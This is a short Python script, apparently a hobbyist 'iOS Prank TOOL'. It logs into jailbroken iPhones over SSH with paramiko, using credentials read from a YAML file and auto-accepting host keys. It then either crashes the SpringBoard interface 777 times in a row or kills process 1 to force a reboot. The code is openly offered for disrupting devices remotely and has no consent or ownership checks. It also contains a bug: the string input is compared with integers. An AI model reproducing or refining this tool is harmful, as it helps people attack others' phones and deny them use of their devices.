from os import system
import yaml
import paramiko
import time
system('reset')
f=open('Data//Data.yaml')
data=yaml.load(f)
ip=data['ip']
port=data['port']
username=data['username']
password=data['password']

client = paramiko.SSHClient()
client.load_system_host_keys()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(ip, port=port, username=username, password=password, sock=None)
choice = input('''The worlds first ever iOS Prank TOOL (FOr Jailbroken iOS Devices That Have OpenSSH)!

Choice 1 = Respring Loop
Choice 2 = Restart Device (Loss Of SSH Communication - Unless Fully
Jailbroken & Not Temporary Re-Jailbroke)

Please Enter Your CHOICE: ''')

if choice == 1:
    for i in range(777):
        client.exec_command('killall SpringBoard')
        time.sleep(0.5)
if choice == 2:
    client.exec_command('kill 1')
